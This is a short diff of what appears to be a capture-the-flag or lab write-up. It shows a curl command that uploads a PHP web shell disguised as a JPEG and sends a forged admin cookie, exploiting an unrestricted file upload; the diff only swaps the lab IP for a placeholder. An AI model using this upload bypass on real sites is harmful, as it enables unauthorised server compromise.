@@ -7,7 +7,7 @@ This vulnerability occurs when a web application allows users to upload files wi
 We used the following `curl` command to upload a malicious PHP file while pretending it is an image:
 
 ```bash
-curl -X POST http://172.16.42.128/?page=upload \
+curl -X POST http://{IP_ADDRESS}/?page=upload \
   -H "Cookie: I_am_admin=68934a3e9455fa72420237eb05902327" \
   -F "uploaded=@shell.php;type=image/jpeg" \
   -F "Upload=Upload"
